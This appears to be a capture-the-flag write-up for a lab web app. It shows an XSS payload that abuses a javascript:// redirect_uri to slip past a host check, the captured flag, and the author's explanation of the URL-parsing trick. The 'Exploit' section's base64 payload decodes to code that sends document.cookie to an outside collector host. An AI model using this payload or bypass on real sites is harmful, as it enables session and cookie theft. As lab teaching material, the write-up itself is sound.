# My Note
## XSS POC
```
https://8eb95a0e3965.pwnbox-lab.com/?redirect_uri=javascript://%250aalert(1);%27@pwnbox.io?%27
```

## Exploit
```sh
node exploit-generator.js
https://8eb95a0e3965.pwnbox-lab.com/?redirect_uri=javascript://%250aeval(atob('bmF2aWdhdG9yLnNlbmRCZWFjb24oJ2h0dHBzOi8vdXgzczc2MzIucmVxdWVzdHJlcG8uY29tJyxkb2N1bWVudC5jb29raWUp'));%27@pwnbox.io?%27
```

## flag
```
pwnbox{b1f2b0b080fbdd6840dcb369b49c2581}
```


# Author's Note
@hossein
A host check that trusts whatever new URL() calls the host is not a host check:

?redirect_uri=javascript://pwnbox.io/%250aalert(origin)
A // after any scheme opens an authority, so the parser reads pwnbox.io as the host (URL Standard, path-or-authority state). JavaScript reads the same //pwnbox.io/ as a line comment, and the newline (%250a) starts the real code.

